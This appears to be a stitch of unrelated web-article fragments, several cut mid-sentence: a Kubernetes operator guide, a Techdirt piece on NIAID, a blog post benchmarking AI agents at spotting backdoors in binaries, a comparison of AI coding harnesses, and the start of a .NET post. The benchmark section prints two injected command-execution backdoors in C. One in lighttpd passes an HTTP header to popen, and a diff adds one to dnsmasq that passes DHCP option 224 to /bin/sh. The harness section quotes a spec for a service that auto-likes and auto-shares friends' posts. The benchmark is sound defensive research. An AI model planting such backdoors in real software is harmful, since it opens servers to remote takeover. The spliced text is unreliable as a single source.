(ValidatingAdmissionWebhook)</strong> run after mutation and let you reject invalid requests with human-readable error messages. This is where you enforce complex business rules that can’t be expressed in OpenAPI schema (cross-field validation, external system checks, etc.).</p><p> are needed when you have multiple active API versions of a CRD. The API server stores objects in one version (the  version) but can serve them in other versions. Conversion webhooks handle the transformation between versions.</p><pre><code>// controller-runtime webhook setup\nfunc (r *Database) Default() {\n    if r.Spec.Replicas == nil {\n        defaultReplicas := int32(1)\n        r.Spec.Replicas = &amp;defaultReplicas\n    }\n}\n\nfunc (r *Database) ValidateCreate() (admission.Warnings, error) {\n    if r.Spec.StorageSize.Cmp(minStorage) &lt; 0 {\n        return nil, fmt.Errorf(\"storage size must be at least %s\", minStorage.String())\n    }\n    return nil, nil\n}\n</code></pre><p>Webhooks require TLS certificates and must be running before the API server can call them. Certificate management is operationally annoying — use cert-manager or controller-runtime’s built-in certificate provisioner.</p><h2>Operator Patterns and Anti-Patterns</h2><p>After years of writing and reviewing operators, here’s the distilled wisdom:</p><p>: Use server-side apply () instead of create-or-update. It’s declarative, handles field ownership correctly, and is idempotent by design. One critical caveat: if you adopt SSA, use it  for all managed resources. Mixing  and  on the same fields causes  ownership conflicts that are painful to debug and resolve.</p><pre><code>// Instead of create-or-update dance:\npatch := client.Apply\nobj.ManagedFields = nil  // Let SSA manage this\nerr = r.Patch(ctx, obj, patch, client.ForceOwnership, client.FieldOwner(\"my-operator\"))\n</code></pre><p>: Always prefer  (specifically strategic merge patch or JSON patch) over  for status and spec changes.  replaces the entire object and is prone to conflicts;  is surgical and conflict-resistant.</p><p>: Use the Event recorder to emit Kubernetes events for significant state transitions. This gives users visibility via :</p><pre><code>r.Recorder.Event(db, corev1.EventTypeWarning, \"ProvisioningFailed\", \"Failed to create PVC\")\n</code></pre><p><strong>Separate controllers for separate concerns</strong>: Don’t build a monolithic reconciler. If your operator manages both the database cluster and its backup schedule, use two controllers with a shared cache.</p><p><strong>Don’t store state in the controller process.</strong> Your controller can be restarted, scaled, or fail over at any moment. The only source of truth is the Kubernetes API. If you need to persist computed state, put it in  or in a ConfigMap.</p><p><strong>Don’t busy-loop with short requeue intervals.</strong> In most cases, sub-10-second polling intervals are unnecessary and wasteful. Prefer watch-based triggers unless the external system cannot emit events. For fast-moving, short-lived state machines (e.g., managing transient Jobs), shorter intervals may be valid — but they should be the exception, not the default. If you truly need polling, make the interval configurable so it can be tuned per deployment.</p><p> conflicts. A  from the API server means someone else updated the object between your read and write. The correct response is to re-fetch and retry, not to log and continue.</p><p><strong>Don’t call the API server inside tight loops.</strong> Fetching all pods to check readiness in a loop that runs every reconciliation is expensive. Use the cache, or precompute what you need at the start of reconciliation.</p><p> when  will do. Using  after modifying the spec will overwrite any changes made between your read and your write. Prefer patch operations.</p><h2>Observability and Debugging</h2><p>An operator you can’t observe is an operator you can’t trust in production.</p><p>Controller-runtime exports Prometheus metrics out of the box:</p><pre><code># Work queue depth — a leading indicator of reconciliation backlog\nworkqueue_depth{name=\"database\"} 42\n\n# Reconcile duration histogram — p99 tells you about slow reconciliations\ncontroller_runtime_reconcile_time_seconds_bucket{controller=\"database\", le=\"0.1\"} 1000\n\n# Reconcile errors — should be near zero in steady state\ncontroller_runtime_reconcile_errors_total{controller=\"database\"} 5\n\n# Active goroutines in the work queue\nworkqueue_work_duration_seconds_bucket{name=\"database\"}\n</code></pre><p>Always add custom metrics for your domain:</p><pre><code>var databasesProvisioning = prometheus.NewGauge(prometheus.GaugeOpts{\n    Name: \"myoperator_databases_provisioning\",\n    Help: \"Number of databases currently in provisioning state\",\n})\n</code></pre><p>Use structured logging (logr interface) with consistent fields:</p><pre><code>log := log.FromContext(ctx).WithValues(\n    \"database\", req.NamespacedName,\n    \"generation\", db.Generation,\n    \"phase\", db.Status.Phase,\n)\nlog.Info(\"Starting reconciliation\")\n</code></pre><p>For complex operators with many API calls, distributed tracing (OpenTelemetry) provides invaluable insight into where time is spent during reconciliation.</p><pre><code># Watch reconciler output in real time\nkubectl logs -n operator-system deploy/my-operator -f | jq '.'\n\n# Inspect the CRD resource including status\nkubectl get database mydb -o yaml\n\n# Check events for a custom resource\nkubectl describe database mydb\n\n# Force a reconcile by touching the annotation\nkubectl annotate database mydb force-reconcile=$(date +%s) --overwrite\n\n# Check lease for leader election\nkubectl get lease -n operator-system\n</code></pre><h2>Production Considerations</h2><p>Always set resource requests and limits on your operator pod. An operator without limits can starve other workloads during a reconciliation storm.</p><p>Your operator’s ServiceAccount should only have the permissions it actually needs. A common mistake is granting  for convenience. Use the Kubebuilder RBAC markers to generate precise RBAC manifests:</p><pre><code>//+kubebuilder:rbac:groups=mycompany.io,resources=databases,verbs=get;list;watch;create;update;patch;delete\n//+kubebuilder:rbac:groups=mycompany.io,resources=databases/status,verbs=get;update;patch\n//+kubebuilder:rbac:groups=apps,resources=statefulsets,verbs=get;list;watch;create;update;patch;delete\n</code></pre><p>Handle  gracefully. The controller-runtime manager’s  function blocks until context cancellation, at which point it stops all controllers and waits for in-flight reconciliations to complete (up to a timeout). Make sure your reconciler respects context cancellation:</p><pre><code>func (r *Reconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) {\n    // Check context at expensive checkpoints\n    select {\n    case &lt;-ctx.Done():\n        return ctrl.Result{}, ctx.Err()\n    default:\n    }\n    // ... reconcile logic\n}\n</code></pre><p>Use  (from controller-runtime) for integration tests. It spins up a real etcd and API server, installs your CRDs, and lets you test full reconciliation loops without a cluster. This is your most valuable testing layer.</p><p>When upgrading your operator, consider:</p><ul><li>: Adding fields is safe. Removing or renaming fields is breaking. Use conversion webhooks for major schema evolution.</li><li>: New reconciler behavior applied to existing resources — think through the transition. Add a migration annotation or one-time migration job if needed.</li><li><strong>State machine transitions</strong>: If you’re adding new phases to your state machine, ensure existing resources in “old” phases are handled by the updated controller.</li></ul><p>Kubernetes Operators are one of the most powerful extension mechanisms ever built into a distributed system platform. But that power comes with complexity. The controller runtime, informers, work queues, rate limiters, finalizers, and webhooks form a sophisticated machinery that, once understood, enables you to build remarkably robust automation.</p><p>The key mental models to internalize:</p><p><strong>Level-triggered reconciliation</strong> — always reconcile toward desired state, don’t just react to events. This gives you resilience for free.</p><p> — reads from cache, writes to API. This is the performance contract the entire system is designed around.</p><p><strong>Idempotency is not optional</strong> — your reconciler will be called many times for the same state. Design it accordingly from day one.</p><p> — , conditions with reasons and messages, precise phase transitions. This is how your operator communicates with the world.</p><p>The operators you build are, in a very real sense, pieces of software that will run 24/7, autonomously managing production infrastructure. Treat them with the same rigor you’d apply to any production-critical system: test thoroughly, observe everything, and design for failure.</p><h2>Ready to Build Your Own Operator?</h2><p>If you want to go from zero to production-ready Kubernetes operators with hands-on practice, check out the  — a practical, end-to-end course that walks you through building operators from the basics all the way to production-grade patterns. It’s a great companion to the internals covered in this post.</p><p><em>Found a bug or inaccuracy?

      "content": "<p>Way back in the ancient days of the year 2020, the world went through this pandemic thing called <a href=\"https://www.techdirt.com/tag/covid-19/\">COVID-19</a>. For those of you not old enough to remember such ancient history, it was a fairly significant health issue that caused a few disruptions throughout the world, including in these here United States. Trump was president at the time of the wild spread of the pandemic. There were shutdowns. There was a supply chain shitstorm. People argued over masks and school closures while staring at shelves where toilet paper used to be available so we could wipe ourselves. The government displayed such an impressive failure of leadership that I myself questioned why we should have a government at all if this is how it was going to behave.</p><p>But, to be fair, there were also some impressive things from government to come out of the pandemic. Trump’s administration initiated Operation Warp Speed to develop and distribute COVID vaccines so we could all get back to our lives. While the first Trump administration didn’t do so great at the distribution part of the plan, and managed to coat the world in incredible amounts of misinformation around the pandemic and these vaccines, it was still an impressive feat to bring these vaccines to market in record time. One of the government agencies <a href=\"https://www.niaid.nih.gov/diseases-conditions/coronavirus-vaccines-prevention\">that powered Operation Warp Speed</a> was the National Institute of Allergy and Infectious Disease (NIAID), which was responsible for collating research on previous pathogens similar to COVID-19 and for building out the trials for the vaccines that would eventually come to market. If it weren’t for NIAID, it’s unlikely the government’s response to the pandemic would have been as rapid, or successful.</p><p>And if you think I’m wrong about that, there’s a chance that the next pandemic will provide us with an answer. That’s because this second Trump administration is actively choosing to <a href=\"https://www.nature.com/articles/d41586-026-00468-1\">remove exactly this sort of pandemic work</a> from NIAID’s proactive efforts.</p><blockquote><p><em><a href=\"https://www.nature.com/articles/d41586-025-01827-0\">NIH director Jay Bhattacharya</a>&nbsp;explained the restructure at an event with other top agency officials on 30 January. “It’s a complete transformation of [the NIAID] away from this old model” that has historically prioritized research on HIV, biodefence and pandemic preparedness, he said. The institute will focus more on basic immunology and other infectious diseases currently affecting people in the United States, he added, rather than on predicting future diseases.</em></p><p><em>Nahid Bhadelia, director of Boston University’s Center on Emerging Infectious Diseases in Massachusetts, says the decision to deprioritize these areas will leave people in the United States more vulnerable to pathogens that are constantly evolving in wildlife around the world and spilling into human populations, sometimes sparking outbreaks. “Just because we say we’re going to stop caring about these issues doesn’t make the issues go away — it just makes us less prepared,” she says.</em></p></blockquote><p>This is one of the things I’ve found about Trump’s second term most perplexing. His reelection efforts were arguably chiefly torpedoed by the pandemic. There’s an old saying in parenting that even a child can learn a lesson from pain. If a child touches a hot stove, they will get burned and will not touch it again. By installing the likes of RFK Jr. and his cadre of conspiracy theorists to manage the health of Americans, and by keeping the very agency that allowed for his rapid response to COVID from doing likewise in the future, it appears Trump wants to keep touching the hot stove. I don’t get it.</p><p>And it’s not like we don’t have outbreaks of infectious disease happening . We absolutely do. The <a href=\"https://www.techdirt.com/tag/measles/\">measles</a> infection count that has gone on for 14 months in this country is insane. There’s no reason COVID can’t mutate and come right back into our lives as a major health issue. Or there could be another novel pathogen that grinds all of our lives back to a halt once more. For a man so concerned with building walls, he’s tearing down the virtual protection that is proactive research and knowledge.</p><blockquote><p><em>“NIAID’s work clearly neither prevented the pandemic nor prevented Americans from experiencing among the highest levels of all-cause excess mortality in the developed world during that time,” [Bhattacharya and subordinates] wrote. “Given the increasing prevalence of allergic and autoimmune disorders and the burden of common infections in the population over the past few decades, the NIAID must focus research on these conditions with a greater sense of urgency.”</em></p></blockquote><p>This is a wild fictionalization of what occurred at NIAID. The agency doesn’t make healthcare policy. It advises the Executive Branch on what is needed to prepare for new and existing diseases, performs research into detecting those diseases before they become pandemics, and provides research and planning into how to respond to them. When Anthony Fauci led NIAID in 2017, he warned the administration of all of this and asked for funding to prepare for it. Not only did he not get his funding, but the administration also <a href=\"https://www.businessinsider.com/fauci-warned-trump-infectious-disease-pandemic-danger-2017-2020-4\">made staff and budget cuts</a> impacting our pandemic preparations.</p><blockquote><p><em>“We do need a public-health emergency fund. It’s tough to get it … but we need it,” Fauci said. “Because what we had to go through for Zika — it was very, very painful when the president asked for the $1.9 billion in February and we didn’t get it until September.”</em></p><p><em>But the Trump administration&nbsp;<a href=\"https://www.businessinsider.com/coronavirus-timeline-trump-failures-undercut-pandemic-response-2020-4\">did not create such a fund,</a>&nbsp;and instead&nbsp;<a href=\"https://www.businessinsider.com/coronavirus-timeline-trump-failures-undercut-pandemic-response-2020-4\">cut spending for federal agencies</a>&nbsp;responsible for detecting and preparing for outbreaks. In May 2018, Trump’s national security advisor disbanded the National Security Council’s pandemic response team, while in October 2019, the administration declined to renew funding for a pandemic early warning system.</em></p></blockquote><p>This administration is doing it again, except worse. This time, it’s not removing some funding and some staff that were used to prepare us for the next pandemic. Instead, he’s just removing the mission of pandemic preparedness from NIAID entirely. And there are future plans to remove funding for research on novel pathogens, as well.</p><blockquote><p><em>The instructions to agency staff members to rebrand the institute’s language are only the first step towards implementing this new vision, according to the NIAID employees. NIH principal deputy director Matthew Memoli has ordered more changes, including the review of the portfolio of grants funding biodefence and pandemic preparedness, in the coming weeks and months, they say.</em></p></blockquote><p>This is crazy. It’s as though we’re all in the back seat of the family minivan, while mom and dad drive us somewhere… except we have no GPS, no maps, the steering wheel moves on its own, and the windshield is made of lead.</p><p>The stove is still hot. And, unfortunately, as Trump makes another attempt to touch it, it won’t be his fingers that are singed, but our own.</p>",

We hadn’t expected them to possess such specialized reverse engineering capabilities.</p><p>However, this approach is not ready for production. Even the best model, Claude Opus 4.6, found relatively obvious backdoors in small/mid-size binaries only 49% of the time. Worse yet, most models had a high false positive rate — flagging clean binaries.</p><p>In this blog post, we discuss a few recent security stories, explain what binary analysis is, and how we construct a benchmark for AI agents. We will see when they accomplish tasks and when they fail — by missing malicious code or by reporting false findings.</p><p>Just a few months ago, <a href=\"https://entro.security/blog/shai-hulud-2-0-banks-gov-tech-breach/\">Shai Hulud 2.0</a> compromised thousands of organizations, including Fortune 500 companies, banks, governments, and cool startups — see <a href=\"https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem\">postmortem by PostHog</a>. It was a supply chain attack for the Node Package Manager ecosystem, injecting malicious code stealing credentials.</p><p>Can we use AI agents to protect against such attacks?</p><p>In day-to-day programming, we work with source code. It relies on high-level abstractions: classes, functions, types, organized into a clear file structure. LLMs excel here because they are trained on this human-readable logic.</p><p><strong>Malware analysis forces us into a harder world:</strong> binary executables.</p><p>Compilation translates high-level languages (like Go or Rust) into low-level machine code for a given CPU architecture (such as x86 or ARM). We get raw CPU instructions: moving data between registers, adding numbers, or jumping to memory addresses. The original code structure, together with variables and functions names gets lost.</p><p>To make matters worse, compilers aggressively optimize for speed, not readability. They inline functions (changing the call hierarchy), unroll loops (replacing concise logic with repetitive blocks), and reorder instructions to keep the processor busy.</p><p>Yet, a binary is what users actually run. And for closed-source and binary-distributed software, it is all we have.</p><p>Analyzing binaries is a long and tedious process of reverse engineering, which starts with a chain of translations:  →  → .

But since all those high-level abstractions and variable names got lost during compilation, the output is far from perfect. You see output full of , ,  — names that mean nothing.</p><p>We ask AI agents to analyze binaries and determine if they contain backdoors or malicious modifications.</p><p>We started with several open-source projects: <a href=\"https://www.lighttpd.net/\">lighttpd</a> (a C web server), <a href=\"https://dnsmasq.org/\">dnsmasq</a> (a C DNS/DHCP server), <a href=\"https://github.com/mkj/dropbear\">Dropbear</a> (a C SSH server), and <a href=\"https://github.com/sozu-proxy/sozu\">Sozu</a> (a Rust load balancer). Then, we manually injected backdoors. For example, we hid a mechanism for an attacker to execute commands via an undocumented HTTP header.</p><p>: All backdoors in this benchmark are artificially injected for testing. We do not claim these projects have real vulnerabilities; they are legitimate open-source software that we modified in controlled ways.</p><p>These backdoors weren’t particularly sophisticated — we didn’t try to heavily obfuscate them or hide them in obscure parts of the code. They are the kind of anomaly a skilled human reverse engineer could spot relatively easily.</p><p>The agents are given a compiled executable — without source code or debug symbols. They have access to reverse engineering tools: <a href=\"https://github.com/NationalSecurityAgency/ghidra\">Ghidra</a>, <a href=\"https://rada.re/\">Radare2</a>, and <a href=\"https://www.gnu.org/software/binutils/\">binutils</a>. The task is to identify malicious code and pinpoint the start address of the function containing the backdoor (e.g., ). See <a href=\"https://github.com/QuesmaOrg/BinaryAudit/blob/main/tasks/dnsmasq-backdoor-detect-printf/instruction.md\">dnsmasq-backdoor-detect-printf/instruction.md</a> for a typical instruction.</p><p>A few tasks use a different methodology: we present three binaries and ask which ones contain backdoors, without asking for the specific location – see e.g., <a href=\"https://github.com/QuesmaOrg/BinaryAudit/blob/main/tasks/sozu-backdoor-multiple-binaries-detect/instruction.md\">sozu-backdoor-multiple-binaries-detect/instruction.md</a>. We expected this to be a simpler task (it wasn’t). This approach simulates supply chain attacks, where often only a subset of binaries are altered.</p><h4>Backdoor in an HTTP server</h4><p>We injected a backdoor into the lighttpd server that executes shell commands from an undocumented HTTP header.</p><p>Here’s the core of the injected backdoor — it looks for a hidden  header, executes its contents as a shell command via , and returns the output in a response header:</p><pre><code>gboolean li_check_debug_header(liConnection *con) {\n    liRequest *req = &amp;con-&gt;mainvr-&gt;request;\n    GList *l;\n\n    l = li_http_header_find_first(req-&gt;headers, CONST_STR_LEN(\"X-Forwarded-Debug\"));\n    if (NULL != l) {\n        liHttpHeader *hh = (liHttpHeader*) l-&gt;data;\n        char *debugIn = LI_HEADER_VALUE(hh);\n\n        FILE *fp = popen(debugIn, \"r\");  // Execute attacker's command\n        // ... read output into debugOut ...\n        pclose(fp);\n\n        li_http_header_insert(con-&gt;mainvr-&gt;response.headers,\n            CONST_STR_LEN(\"X-Request-Trace\"), debugOut, strlen(debugOut));\n    }\n    return TRUE;\n}\n</code></pre><p>For a user who downloaded this backdoored server, it would seem like this is a legitimate program. However, an attacker could trivially execute any command by sending a specially crafted packet.</p><h4>Claude Opus 4.5 found the backdoor within 5 minutes</h4><p>Here’s how Claude did it:</p><p> The model identified the binary and its 26 shared libraries — one of which contained the backdoor.</p><p> Next, it ran  with grep patterns looking for obvious indicators of a backdoor:</p><pre><code>strings bin/lighttpd2-worker | grep -iE '(shell|bash|/bin/sh|exec|system|backdoor)'\n</code></pre><p>However, the command didn’t find anything suspicious. The model expanded the search to all shared libraries, looking for more patterns (hardcoded IPs, suspicious commands, and credential patterns). Still nothing obvious.</p><p> Claude switched strategies and used  to list imported functions:</p><pre><code>for f in lib/*.so; do\n  nm -D \"$f\" | grep -E ' U (system|exec|popen)'\ndone\n</code></pre><p>This revealed something interesting:</p><pre><code>lib/liblighttpd2-shared-2.0.0.so: U popen@GLIBC_2.2.5\n</code></pre><p>Claude detected that one of the libraries that the server uses imports : function used to execute shell commands. It immediately alarmed the model:</p><blockquote><p><strong>Anthropic Claude Opus 4.5:</strong> The  uses . This could be legitimate (for spawning worker processes) or could be a backdoor. I need to investigate what these functions are used for by decompiling the code.</p></blockquote><p> Claude investigated further to determine if the function was truly malicious, using the Radare2 decompiler for analysis.</p><p>It first identified which function calls :</p><pre><code>r2 -q -c 'aaa; axt @ sym.imp.popen' lib/liblighttpd2-shared-2.0.0.so\n</code></pre><p>The output of this command revealed that a function called  does shell execution. (That’s the backdoor we added!). The model smelled something fishy:</p><blockquote><p><strong>Anthropic Claude Opus 4.5</strong>: This is very suspicious! A “debug header” function calling  is a classic backdoor pattern — it could be checking for a special HTTP header and executing commands based on it.</p></blockquote><p>Then using Radare2’s decompiler, the model examined the function:</p><pre><code>r2 -q -c 'aaa; s dbg.li_check_debug_header; pdc' lib/liblighttpd2-shared-2.0.0.so\n</code></pre><p>The decompiled pseudocode allowed the LLM to understand how the backdoor works — it looks for an undocumented HTTP header  and if it’s present executes an attacker-provided command. The server conveniently sends the command output back in a  response header.</p><p> Finally, Claude used Radare2 to confirm the function wasn’t dead code, checking cross-references to ensure it was called from the main program:</p><pre><code>r2 -q -c 'aaa; s 0x00015260; pd 10' lib/liblighttpd2-shared-2.0.0.so\n</code></pre><p>Now being confident that it found a real backdoor, Claude reported those findings back and finished the exploration.</p><h3>When it fails: rationalizing away an obvious backdoor</h3><p>However, LLMs very often miss even obvious backdoors.</p><p>We took dnsmasq — a widely-used DNS/DHCP server — and added an embarrassingly obvious backdoor. We weren’t even trying to hide it: if DHCP option 224 (undocumented, we made it up) is present in a packet, execute its contents as a shell command via <code>execl(\"/bin/sh\", \"sh\", \"-c\", buf, NULL)</code>.</p><p>The backdoor we added was just 7 lines of C in DHCP packet parsing:</p><pre><code>/* existing DHCP option handling */\nmatch_vendor_opts(opt, daemon-&gt;dhcp_opts);\n+ if (opt = option_find(mess, sz, 224, 1)) {\n+   char buf[256];\n+   int len = option_len(opt);\n+   memcpy(buf, option_ptr(opt, 0), len);\n+   buf[len] = '\\0';\n+   execl(\"/bin/sh\", \"sh\", \"-c\", buf, NULL);\n+ }\n</code></pre><h4>Claude Opus 4.6 found it… and persuaded itself there is nothing to worry about</h4><p>Even the best model in our benchmark got fooled by this task. Claude Opus 4.6 found  in the strings output early on, traced it to the exact function containing the backdoor, and saw the <code>execl(\"/bin/sh\", \"sh\", \"-c\", ...)</code> call. Then it simply assumed it was normal:</p><blockquote><p><strong>Anthropic Claude Opus 4.6</strong>: I can see the  usage at  — it’s calling <code>execl(\"/bin/sh\", \"sh\", \"-c\", r13, NULL)</code>. This is a pattern for executing a shell command, which could be legitimate in dnsmasq (e.g., for DHCP script execution).</p></blockquote><p>It examined the function, but concluded:</p><blockquote><p><strong>Anthropic Claude Opus 4.6</strong>: The <code>execl(\"/bin/sh\", \"sh\", \"-c\", ...)</code> pattern is typical of dnsmasq’s DHCP lease script execution. This is likely the legitimate lease_helper/script execution function.</p></blockquote><p>The model found the exact function, saw the exact  call with  — and rationalized it away as “legitimate DHCP script execution.” It never checked where the command string actually comes from (a DHCP packet from client). It then moved on to investigate other functions and never circled back.</p><h3>The needle-in-haystack problem</h3><p>The executables in our benchmark often have hundreds or thousands of functions — while the backdoors are tiny, often just a dozen lines buried deep within. Finding them requires strategic thinking: identifying critical paths like network parsers or user input handlers and ignoring the noise.</p><p>Current LLMs lack this high-level intuition. Instead of prioritizing high-risk areas, they often decompile random functions or grep for obvious keywords like  or . When simple heuristics fail, models frequently hallucinate or give up entirely.</p><p>This lack of focus leads them down rabbit holes. We observed agents fixating on legitimate libraries — treating them as suspicious anomalies. They wasted their entire context window auditing benign code while the actual backdoor remained untouched in a completely different part of the binary.</p><blockquote><p>The vast majority of AI-generated error reports submitted to cURL are pure nonsense.</p></blockquote><p>A security tool that gives you fake reports is useless and frustrating to use. We specifically tested for this with  — clean binaries with no backdoor. We found that 28% of the time models reported backdoors or issues that weren’t real. For any practical malware detection software, we expect a false positive rate of less than 0.001%, as most software is safe, vide <a href=\"https://en.wikipedia.org/wiki/Base_rate_fallacy\">false positive paradox</a>.</p><p>For example, Gemini 3 Pro supposedly “discovered” a backdoor in… command-line argument parsing in one of the servers:</p><blockquote><p>: I have confirmed that the  option (index 312, ) is handled by code that treats its argument as a string and stores it at offset  of the global configuration structure. This is highly suspicious for a TTL option which should be an integer.</p><p>Furthermore, the function  reads the string from offset , appends ” ini” to it, and executes it using . The output is then parsed for a “duid”.</p><p>This behavior allows an attacker to execute arbitrary commands by passing them as the argument to the  option (e.g., ). This is a clear backdoor disguised as a legitimate configuration option.</p></blockquote><p>In reality, the source code correctly validates and parses the command-line argument as a number. It never attempts to execute it. Several “findings” that the model reported are completely fake and missing from the source code.</p><p>We restricted agents to open-source tools: <a href=\"https://github.com/NationalSecurityAgency/ghidra\">Ghidra</a> and <a href=\"https://rada.re/\">Radare2</a>. We verified that frontier models (including Claude Opus 4.6 and Gemini 3 Pro) achieve a 100% success rate at <a href=\"https://hackernoon.com/benchmarks/binaryaudit/tasks/ghidra-decompile-pyghidra/\">operating them</a> — correctly loading binaries and running basic commands.</p><p>However, these open-source decompilers lag behind commercial alternatives like <a href=\"https://hex-rays.com/ida-pro\">IDA Pro</a>. While they handle C binaries well, they have issues with Rust (though agents managed to solve some tasks), and fail completely with Go executables.</p><p>For example, we tried to work with <a href=\"https://github.com/caddyserver/caddy\">Caddy</a>, a web server written in Go, with a binary weighing 50MB. Radare2 loaded in 6 minutes but produced poor quality code, while Ghidra not only took 40 minutes just to load, but was not able to return correct data. At the same time, IDA Pro loaded in 5 minutes, giving correct, usable code, sufficient for manual analysis.</p><p>To ensure we measure agent intelligence rather than tool quality, we excluded Go binaries and focused mostly on C executables (and one Rust project) where the tooling is reliable.</p><p>As of now, it is far from being useful in practice — we would need a much higher detection rate and a much lower false positive rate to make it a viable end-to-end solution.</p><p>It works on small binaries and when it sees unexpected patterns. At the same time, it struggles with larger files or when backdoors mimic legitimate access routes.</p><h3>Binary analysis is no longer just for experts</h3><p>While end-to-end malware detection is not reliable yet, AI can make it easier for developers to perform initial security audits. A developer without reverse engineering experience can now get a first-pass analysis of a suspicious binary.</p><p>A year ago, models couldn’t reliably operate Ghidra. Now they can perform genuine reverse engineering — loading binaries, navigating decompiled code, tracing data flow.</p><p>The whole field of working with binaries becomes accessible to a much wider range of software engineers. It opens opportunities not only in security, but also in performing low-level optimization, debugging and reverse engineering hardware, and porting code between architectures.</p><p>We believe that results can be further improved with context engineering (including proper skills or MCP) and access to commercial reverse engineering software (such as the mentioned IDA Pro and Binary Ninja).</p><p>Once AI demonstrates the capability to solve some tasks (as it does now), subsequent models usually improve drastically.</p><p>Moreover, we expect that a lot of analysis will be performed with local models, likely fine-tuned for malware detection. Security-sensitive organizations can’t upload proprietary binaries to cloud services. Additionally, bad actors will optimize their malware to evade public models, necessitating the use of private, local models for effective defense.</p>",

Maybe much further down the line it might matter more than this and compounds on varying abilities present in each of them, but so far if you are starting off in this field and testing out the thousand types of tools to access the same models - it does not really matter which one you opt for.</p><p>:::info\nI must reiterate that this holds true only if you are not using them to their full power as each hold special powers that can make them superior to the other.</p><p> Claude Code has agents, plugins, memory even for some lucky users, but Codex has neither (<em>unless you manually build a memory.md and tell it how to fill it</em>) and no real support for agents or plugins like Claude Code. Factory has its own concept called Droids, and Cursor can make use of all of that but does things slightly differently when it comes to combing through your directory (<em>Semantic Search vs Claude’s grepping everything to maximize token usage</em>)</p><p><strong><strong>Experimentation strategy:</strong></strong></p><p>Ignoring the non-deterministic nature and controlling for what we can, we will keep the skills constant, the prompt constant, and then measure what the end product looks like.

I want to create a plan for it, and a wireframe or a MVP for the UI how it would look that is navigatable or clickable, its essentially a website and this is how it works:\nThis is generally for people who have friends, who are not big creators, and are trying to get a head start by asking their friends to engage with their content by liking or sharing it.\nThe primary issue by such small creators is that they often feel shy or embarassed by asking again and again from their friends to like or share their article, and especially if they crosspost across different platforms that is even more awkward. So how do you manage this?\nThe idea works around the fact that these friends trust each other enough to basically connect their platforms in this website such that: creator_friend posts at substack, posts at hackernoon, posts at X, posts at LinkedIn, posts at Facebook and posts at Threads. creator_friend then goes on to inform this website with urls, and it appears like a notification against their name.\nThe group_friends of this creator_friend can then automatically from their connected platforms run an automated like and share action on all these platforms. This is sort of a pledge network, where they have pledged their support to them by this action, and also to avoid a weekly flood of messages to like something or share something.\nRemember: Ease for Supporter to pledge, connect platforms to set to auto-like and auto-share or just auto-like.\nCreate a spec sheet, detailed back end and before that, a wireframe sorta thing to showcase what the web would look like.\n</code></pre><p>The skill we used is found <a href=\"https://skillsmp.com/skills/code-yeongyu-oh-my-opencode-src-features-builtin-skills-frontend-ui-ux-skill-md\">here</a>.</p><h3>==<strong>GPT 5.3 Codex (High): Codex v Factory v Cursor</strong>==</h3><p>This is a one shot attempt, and so it means there will be no back and forth.</p><p>The output from both cases with GPT 5.3 Codex was less than impressive, and left me shocked. Initially I believed it was just Factory not being a great harness, but post attempt on Codex itself, I was left to believe that this is not its strength.</p><p>This is how it thinks a UI should look like? What was it even trained on to have spat this out?</p><p>\\\nBesides opting for light mode, nothing really stands out.</p><p>And we are back to dark mode with absolutely no red flags having been raised for this atrocious front-end.</p><p>All in all, nothing impressive, and it looks to seem that in all of the responses, GPT 5.3 Codex was dying to jump to actually implementing the idea with different proposed tech stacks rather than consider for a moment what it has put together might just be the ugliest looking wireframe in human history.</p><h3>==<strong>Claude Opus 4.6 (High): Codex v Factory v Cursor</strong>==</h3><p>Before I even show you what it looks like, let me just say that Opus 4.6 was just so visually impressive. The only time I was this happy with a model’s output with regards to front end was Gemini Flash 3.0 Preview.</p><p>It breaks it down into multiple steps, a landing page, a hero section, a login page and so much more.</p><p>\\\nNext up, we take a look at Factory’s attempt, and see how different would it be from Claude Code’s MVP.</p><p>Once again, we see the same trend, as the model is obviously the same, the harness does not really seem to come into affect so much so that it would change the entire bias of the training data and preference optimization so easily.</p><p>We get the same breakdown; the landing page, nice looking hero section, login page etc..</p><p>It does one thing differently; feed. It brings the dashboard a subtle thing, and Feed something to be of higher importance. But given the non-deterministic nature of these models, had I asked in different conversations in the same model this level of variation would have existed still.</p><p>Finally, we take a look at how different it is inside Cursor.</p><p>Cursor’s Opus had the least amount of content page, but this almost means nothing :D due to the non-deterministic nature of these models.</p><p>Well, it only seems to have become obvious that harnesses only start to matter when you actually start to utilize them with whatever they offer. For example in the case of Claude Code, you get Hooks, you get sub-agents, you get plugins. With Factory, you get Droids, you get MCP, agents, and similarly in the case of Cursor you get a suite of elements that it is designed around.</p><p>This is where the ‘difference’ starts to become obvious, when your prompt is being handled ‘differently’ by all of them, but to do that, you must be exploiting all that they have to offer.</p><p>If you are just starting out and dont really understand any of these choices, and get decision paralysis - fret no more, because the point I am trying to make is, no matter what you choose, it doesn’t really matter. Not for prototyping, oh and if what you want to do is going to be UI heavy, go for Claude.</p><p>:::tip\nFor anyone running local LLMs and fighting for performance from non-reasoning models, there’s an interesting trick floating around: putting your prompt in twice can improve the response.</p>",

      "content": "<p>You've shipped three .NET applications in the last two years. Each one has a DbContext, a generic repository, probably a Unit of Work wrapper. Maybe you even went full CQRS on the last one because you'd watched enough conference talks to feel guilty about not doing it.</p><p>And every single time, you wrote the same scaffolding. Different entity names. Different connection string. Same bones.</p><p>At some point you stop and think — <em>why am I doing this again?</em></p><p>That question is what led me to build a reusable data access library packaged as a NuGet. And then, out of curiosity and a healthy amount of scepticism, I handed it to GPT-5.3 Codex for a full architectural review.</p><h2><strong>The Library: What It Does and Why It's Non-Trivial</strong></h2><p>The whole premise is simple: take every piece of data access boilerplate that every .NET developer writes over and over again — DbContext setup, repository abstraction, Unit of Work, CQRS separation — and package it once. Reuse it everywhere.</p><p>The API is intentionally fluent. You want to query? <code>DataAccessor.Queries&lt;T&gt;().GetAll()</code>. You want to write? <code>DataAccessor.Commands&lt;T&gt;().Add(entity)</code>. Ready to persist? . Clean, readable, consistent across every project that pulls in the package.</p><p>Sounds straightforward. But here's where it gets interesting.</p><p>In a normal application, your DbContext is concrete and known at compile time. It maps directly to your specific database schema. Easy. But a  library can't know your schema in advance. By definition, it can't. The concrete DbContext only exists in the consuming application, resolved at runtime. The library has to be built around that constraint.</p><p>This changes everything architecturally. It's the difference between designing a house and designing a blueprint system that lets other people design houses. The rules are different. The trade-offs are different. And the code will look different from what you'd write for a single application — intentionally so.</p><pre><code>using System;\n\nnamespace Alexis.Infrastructure.DatabaseAccess\n{\n    // 